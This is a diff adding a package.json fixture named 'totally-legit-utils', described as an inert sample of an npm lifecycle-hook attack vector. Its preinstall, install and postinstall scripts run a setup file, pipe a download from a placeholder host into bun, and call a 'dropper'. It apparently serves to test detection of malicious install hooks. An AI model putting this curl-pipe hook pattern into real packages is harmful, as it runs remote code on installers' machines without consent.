@@ -1,0 +1,11 @@
+{
+  "name": "totally-legit-utils",
+  "version": "1.0.0",
+  "description": "inert fixture — npm lifecycle-hook execution vector (#1090)",
+  "scripts": {
+    "preinstall": "node setup_bun.js",
+    "postinstall": "curl -s https://example.invalid/x | bun -",
+    "install": "bunx some-dropper",
+    "test": "jest"
+  }
+}
